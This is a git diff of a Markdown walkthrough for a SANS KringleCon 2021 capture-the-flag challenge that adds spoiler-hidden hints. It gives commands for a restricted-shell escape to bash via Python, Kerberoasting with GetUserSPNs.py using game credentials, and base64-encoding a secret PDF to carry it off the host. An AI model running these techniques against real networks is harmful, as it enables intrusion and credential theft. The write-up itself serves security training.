@@ -1,35 +1,106 @@
 ## Summary
-This challenge opens up after finishing challenge 7 - Printer Exploitation. \
-"Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal (https://register.elfu.org/). Find Eve Snowshoes in Santa's office for hints."
+This challenge opens up after finishing challenge 7 - Printer Exploitation.
+
+**Objective**: "Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal (https://register.elfu.org/). Find Eve Snowshoes in Santa's office for hints."
 
 From the challenge name and description, we know this will be a Windows domain and that we'll have to pivot/auth to the various hosts in the domain in order to find the secret sleigh research doc.
 
-Eve Snowshoe will give you a hint after you finish the HoHoNo Fail2Ban challenge in Santa's office. Here's his hint.
-Hint:
-A few resources:
-- https://www.youtube.com/watch?v=iMh8FTzepU4
-- https://github.com/chrisjd20/hhc21_powershell_snippets
+Eve Snowshoe will give you a hint after you finish the HoHoNo Fail2Ban challenge in Santa's office:
+
+<details>
+  <summary>Eve Snowshoe's Hint</summary>
+  https://www.youtube.com/watch?v=iMh8FTzepU4
+  
+  https://github.com/chrisjd20/hhc21_powershell_snippets
+</details>
 
 [Next Challenge](9%20-%20Splunk!.md)\
 [Back to Table of Contents](https://github.com/minispooner/SANS_KringleCon_2021_Walkthrough/blob/main/README.md)
 
 ## Steps
-1. Go to https://register.elfu.org/
-2. Register with rocks4socks@elfu.org (found in registration page source code)
-It returns access creds:
-New Student Domain Account Creation Successful!
-You can now access the student network grading system by SSH'ing into this asset using the command below:
-`ssh knuefahyyw@grades.elfu.org -p 2222`
-ElfU Domain Username: knuefahyyw
+1. Go to https://register.elfu.org/ and start hacking!
+
+<details>
+  <summary>Registration - Hint</summary>
+  Just register with anything :)
+</details>
+
+<details>
+  <summary>Initial Access After Registration - Hint 1</summary>
+  Try breaking out of the program. How?
+</details>
+<details>
+  <summary>Initial Access After Registration - Answer 1</summary>
+  ctrl + d
+</details>
+<details>
+  <summary>Initial Access After Registration - Hint 2</summary>
+  How can we get a shell? What language are we in, often characterized by the ">>>"?
+</details>
+<details>
+  <summary>Initial Access After Registration - Answer 2</summary>
+  import os;os.system('/bin/bash')
+</details>
+
+<details>
+  <summary>Escalation or Pivoting - Hint</summary>
+  Kerberoasting on a open fire :)
+</details>
+<details>
+  <summary>Escalation or Pivoting - Answer</summary>
+  python3 GetUserSPNs.py elfu.local/USER:PASS -outputfile out.txt
+</details>
+
+
+
+... WARNING ... SPOILERS & ANSWERS BELOW ...
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+... WARNING ... SPOILERS & ANSWERS BELOW ...
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+... WARNING ... SPOILERS & ANSWERS BELOW ...
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+... WARNING ... SPOILERS & ANSWERS BELOW ...
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+... WARNING ... SPOILERS & ANSWERS BELOW ...
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+
+## Answer Walkthrough
+Register with anything
+
+It returns access creds:\
+New Student Domain Account Creation Successful!\
+You can now access the student network grading system by SSH'ing into this asset using the command below:\
+`ssh knuefahyyw@grades.elfu.org -p 2222`\
+ElfU Domain Username: knuefahyyw\
 ElfU Domain Password: Sxdenyfaj#
 
 ### Shell escape
-After SSHing in, run ctl d to escape into python, then get a tty interactive shell:
+After SSHing in, run ctl d to escape into python, then get a an OS shell - pty.spawn() causes issues, so try os.system()
 
-import os;os.system('/bin/bash')
+`import os;os.system('/bin/bash')`
 
 ### Kerberoasting
-python3 GetUserSPNs.py elfu.local/knuefahyyw:Sxdenyfaj# -outputfile out.txt
+`python3 GetUserSPNs.py elfu.local/knuefahyyw:Sxdenyfaj# -outputfile out.txt`
 
 ### Hash Cracking
 ```
@@ -83,3 +154,11 @@ openssl base64 -in SantaSecretToAWonderfulHolidaySeason.pdf -out LOOT.pdf
 cat LOOT.pdf | tr -d '\n'
 copy paste to host machine to view the PDF (save to loot.pdf)
 cat loot.pdf | base64 -d > final.pdf
+
+
+
+
+<details>
+  <summary></summary>
+  
+</details>
